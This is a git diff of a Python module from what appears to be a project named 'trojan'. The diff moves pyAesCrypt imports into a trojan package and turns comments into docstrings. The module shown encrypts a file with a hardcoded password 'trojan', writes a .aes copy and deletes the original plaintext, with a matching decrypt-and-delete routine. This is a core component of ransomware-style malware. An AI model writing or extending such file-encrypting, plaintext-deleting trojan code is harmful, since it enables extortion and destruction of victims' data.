@@ -1,15 +1,15 @@
-from pyAesCrypt import encryptFile
-from pyAesCrypt import decryptFile
 from pathlib import Path
-
+from trojan.pyAesCrypt import encryptFile
+from trojan.pyAesCrypt import decryptFile
 
 password = "trojan"
 bufferSize = 64 * 1024  # 64k
 
-
-# encrypt the file at input_file_path_str
-# input_file_path_str can be relative or absolute
-# deletes the input file at the end
+"""
+encrypt the file at input_file_path_str
+input_file_path_str can be relative or absolute
+deletes the input file at the end
+"""
 def encryptAndDeletePlaintext(input_file_path_str):
     # name the output file the same as the input file, but append .aes to it
     output_file_path_str = input_file_path_str + ".aes"
@@ -22,10 +22,11 @@ def encryptAndDeletePlaintext(input_file_path_str):
         # on file read error, do nothing
         pass
 
-
-# decrypt the file at input_file_path_str
-# input_file_path_str can be relative or absolute
-# deletes the input file at the end
+"""
+decrypt the file at input_file_path_str
+input_file_path_str can be relative or absolute
+deletes the input file at the end
+"""
 def decryptAndDeleteCipherText(input_file_path_str):
     # output filename = input filename + ".decrypted"
     output_file_path_str = input_file_path_str + ".decrypted"
